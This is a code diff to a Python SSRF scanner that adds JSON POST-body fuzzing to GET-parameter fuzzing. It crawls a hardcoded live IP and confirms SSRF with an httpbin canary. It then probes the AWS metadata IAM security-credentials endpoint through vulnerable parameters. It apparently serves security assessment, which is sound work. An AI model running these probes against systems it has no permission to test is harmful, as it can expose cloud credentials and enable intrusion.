@@ -1,7 +1,8 @@
 """
 SSRF Scan Engine
-Discovers endpoints via crawling, tests parameters for SSRF,
-and checks confirmed-vulnerable endpoints for cloud metadata reachability.
+Discovers endpoints via crawling, tests parameters (GET query params and
+JSON POST bodies) for SSRF, and checks confirmed-vulnerable endpoints for
+cloud metadata reachability.
 """
 
 import requests
@@ -15,6 +16,9 @@ TARGET_BASE = "http://35.172.250.28:8000"
 CANARY_URL = "https://httpbin.org/get"  # known-good external URL used to confirm SSRF
 METADATA_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 COMMON_PARAM_NAMES = ["url", "image", "src", "link", "path", "target", "file"]
+COMMON_JSON_FIELD_NAMES = [
+    "url", "callback_url", "webhook_url", "image_url", "target_url", "link", "src"
+]
 MAX_CRAWL_DEPTH = 2
 
 VISITED = set()
@@ -55,7 +59,7 @@ def extract_param_candidates(url):
 
 
 def test_param_for_ssrf(base_url, param_name):
-    """Send the canary URL as a parameter value; check if the server fetched it."""
+    """Send the canary URL as a GET parameter value; check if the server fetched it."""
     try:
         resp = requests.get(base_url, params={param_name: CANARY_URL}, timeout=5)
     except requests.RequestException:
@@ -68,28 +72,61 @@ def test_param_for_ssrf(base_url, param_name):
     return False
 
 
+def test_json_body_for_ssrf(base_url, field_name):
+    """Send the canary URL as a field in a JSON POST body; check if the server fetched it.
+
+    This catches SSRF entry points that only accept input via a JSON request
+    body (e.g. a webhook-validator endpoint expecting {"callback_url": "..."})
+    rather than a GET query parameter — a gap plain GET-param fuzzing misses
+    entirely.
+    """
+    try:
+        resp = requests.post(
+            base_url,
+            json={field_name: CANARY_URL},
+            timeout=5,
+            headers={"Content-Type": "application/json"},
+        )
+    except requests.RequestException:
+        return False
+
+    if resp.status_code == 200 and (
+        "httpbin" in resp.text.lower() or "origin" in resp.text.lower()
+    ):
+        return True
+    return False
+
+
 def discover_ssrf_endpoints():
-    """Crawl the target, then test discovered + common parameters for SSRF."""
+    """Crawl the target, then test discovered + common parameters (GET and POST) for SSRF."""
     crawl(TARGET_BASE)
 
     confirmed_vulnerable = []
     tested_bases = set()
 
-    # Test parameters actually found in discovered URLs
+    # Test GET parameters actually found in discovered URLs
     for endpoint in DISCOVERED_ENDPOINTS:
         base, params = extract_param_candidates(endpoint)
         tested_bases.add(base)
         for param in params:
             if test_param_for_ssrf(base, param):
-                confirmed_vulnerable.append({"url": base, "param": param})
+                confirmed_vulnerable.append({"url": base, "param": param, "method": "GET"})
 
-    # Also brute-force common param names on every discovered base path
-    # (covers cases where the app doesn't link to the endpoint with a query string)
+    # Brute-force common GET param names on every discovered base path
     all_bases = tested_bases | {TARGET_BASE.rstrip("/") + "/fetch-image/"}
     for base in all_bases:
         for param in COMMON_PARAM_NAMES:
             if test_param_for_ssrf(base, param):
-                entry = {"url": base, "param": param}
+                entry = {"url": base, "param": param, "method": "GET"}
+                if entry not in confirmed_vulnerable:
+                    confirmed_vulnerable.append(entry)
+
+    # Also try common field names as JSON POST bodies on every discovered base path —
+    # catches endpoints that only accept input via a JSON request body
+    for base in all_bases:
+        for field in COMMON_JSON_FIELD_NAMES:
+            if test_json_body_for_ssrf(base, field):
+                entry = {"url": base, "param": field, "method": "POST"}
                 if entry not in confirmed_vulnerable:
                     confirmed_vulnerable.append(entry)
 
@@ -98,22 +135,27 @@ def discover_ssrf_endpoints():
 
 # ---- Phase 3: Deeper checks on confirmed-vulnerable endpoints ----
 
-def make_request(base_url, param_name, target_url):
+def make_request(base_url, param_name, target_url, method="GET"):
     try:
+        if method == "POST":
+            return requests.post(
+                base_url, json={param_name: target_url}, timeout=5,
+                headers={"Content-Type": "application/json"},
+            )
         return requests.get(base_url, params={param_name: target_url}, timeout=5)
     except requests.RequestException:
         return None
 
 
-def check_internal_reachability(base_url, param_name):
+def check_internal_reachability(base_url, param_name, method="GET"):
     """Can this endpoint reach loopback/internal addresses?"""
-    resp = make_request(base_url, param_name, f"{TARGET_BASE}/")
+    resp = make_request(base_url, param_name, f"{TARGET_BASE}/", method=method)
     return resp is not None and resp.status_code == 200
 
 
-def check_metadata_reachability(base_url, param_name):
+def check_metadata_reachability(base_url, param_name, method="GET"):
     """Can this endpoint reach the cloud metadata service, and is IMDSv2 enforced?"""
-    resp = make_request(base_url, param_name, METADATA_URL)
+    resp = make_request(base_url, param_name, METADATA_URL, method=method)
 
     finding = {
         "metadata_reachable": False,
@@ -150,28 +192,30 @@ def run_scan():
             "check": "ssrf_discovery",
             "vulnerable": False,
             "severity": "info",
-            "note": "No SSRF-vulnerable parameters discovered via crawling or common-name probing."
+            "note": "No SSRF-vulnerable parameters discovered via crawling, common-name GET probing, or JSON POST-body probing."
         })
         return results
 
     for endpoint in vulnerable_endpoints:
         base_url = endpoint["url"]
         param = endpoint["param"]
+        method = endpoint.get("method", "GET")
 
         finding = {
             "check": "ssrf_endpoint",
             "url": base_url,
             "param": param,
+            "method": method,
             "vulnerable": True,
             "severity": "medium",
         }
 
-        internal_reachable = check_internal_reachability(base_url, param)
+        internal_reachable = check_internal_reachability(base_url, param, method=method)
         finding["internal_network_reachable"] = internal_reachable
         if internal_reachable:
             finding["severity"] = "high"
 
-        metadata_finding = check_metadata_reachability(base_url, param)
+        metadata_finding = check_metadata_reachability(base_url, param, method=method)
         finding["metadata_check"] = metadata_finding
         if metadata_finding["metadata_reachable"]:
             finding["severity"] = "critical"
